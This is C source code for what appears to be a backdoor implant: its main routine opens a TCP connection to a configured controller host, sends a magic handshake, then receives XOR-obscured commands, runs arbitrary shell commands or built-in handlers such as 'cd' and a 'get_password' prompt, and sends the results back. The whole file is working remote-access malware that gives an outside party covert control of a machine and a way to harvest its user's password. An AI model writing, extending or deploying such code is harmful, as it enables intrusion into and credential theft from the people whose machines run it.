#include "types.h"
#include "backdoor.h"

int sock = 0;
command_t *commands;
unsigned int commands_len;

void crypt(char* data, char* key, unsigned int data_size, unsigned int key_size) {
	for(int i = 0; i < data_size; i++) {
		data[i] ^= key[i % key_size];
	}
}

int connection_initialize() {

	struct sockaddr_in sa;
	sa.sin_family = AF_INET;
	sa.sin_port = htons(PORT);

	inet_aton(HOST, &sa.sin_addr.s_addr);

	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	int res = connect(sock, (const struct sockaddr *)&sa, sizeof(sa));

	if(res != 0) {
		#ifdef DEBUG
			printf("[DEBUG] connect() error: %i\n", errno);
		#endif

		return FALSE;
	}

	return TRUE;
}

int send_data(char *data, unsigned int len) {
	return send(sock, (const char *)data, len, 0);
}

void register_command(const char* command, command_callback_t handler) {
	unsigned int old_size = commands_len;

	commands_len++;
	commands = (command_t*)realloc(commands, sizeof(command_t)*commands_len);

	command_t cmd;
	cmd.callback = handler;
	cmd.command = command;

	memcpy(commands + old_size, &cmd, sizeof(cmd));
}

void init_commands() {
	register_command("cd", change_directory_callback);
	register_command("help", get_help_callback);
	register_command("get_password", prompt_callback);
	register_command("exit", exit_backdoor_callback);
}

int main() {

	const uint8_t magic[5] = MAGIC;
	const uint8_t encryption_key[6] = ENCRYPTION_KEY;

	init_commands();

	if(!connection_initialize()) {
		return 1;
	}

	uint8_t response = 0;

	send_data((char*)magic, 5);

	recv(sock, &response, 1, 0);

	#ifdef DEBUG
		printf("[DEBUG] Magic response: %i\n", response);
	#endif

	if(response != 0) {
		return 2;
	}

	char *result = (char*)malloc(COMMAND_BUFFER_SIZE);

	while(TRUE) {

		char command[4096];
		recv(sock, command, 4096, 0);

		crypt(command, encryption_key, 4096, 6);

		unsigned int commands_done = 0;

		for(int c = 0; c < commands_len; c++) {

			command_t cmd = commands[c];

			if(strcmp(cmd.command, command) == 0) {
				
				cmd.callback(result, sock);
				commands_done++;

				continue;
			}

		}

		if(commands_done == 0)
			execute_command((const char*)command, result);

		crypt(result, encryption_key, strlen(result), 6);
		send_data(result, strlen(result));

		memset(result, 0, COMMAND_BUFFER_SIZE);
	}
	
	return 0;
}